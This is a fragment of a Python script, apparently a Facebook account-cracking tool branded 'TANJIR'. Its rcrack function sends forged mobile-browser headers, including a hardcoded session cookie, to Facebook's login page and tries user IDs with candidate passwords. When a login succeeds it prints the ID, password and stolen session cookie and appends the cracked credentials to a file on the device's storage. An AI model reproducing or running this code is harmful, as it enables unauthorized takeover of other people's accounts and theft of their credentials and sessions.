...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=glXAZU0FmeIJ685cN0yezZVF; sb=glXAZch5XwmkkgITWepIGLlI; ps_l=0; ps_n=0; vpd=v1%3B680x360x2; m_pixel_ratio=2; x-referer=eyJ2NvbmZpcm1lbWFpbC5waHA%%; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2403%3Btimestamp%3A1707150382; wd=360x680; fr=0E6WZvYvgXECWXZkK.AWUrZrD_IFf_aoLJ-bDvl984aS4.BlwFWC.pK.AAA.0.0.BlwQyJ.AWV6KvbXHsg',
    'dpr': '2',
    'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=Afc3UIaLewNgi269pIGsFKhqHMPDi7Pgd_mvkAQeufAgW8KUxOBElFWb2Sv3Y3IaelSV8flyjpq_EeV658A0jBw9soSM31cmvWNo7gj7Qxg&smuh=29729&lh=Ac_NBXcyQ5n1xbCpe9g&wtsid=rdr_0GWrNiYGZ2JagwuFp&_rdr',
    ...
    'sec-fetch-site': 'sme-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linx; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[TANJIR-OK🍁] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/TANJIR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}TANJIR🥰{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
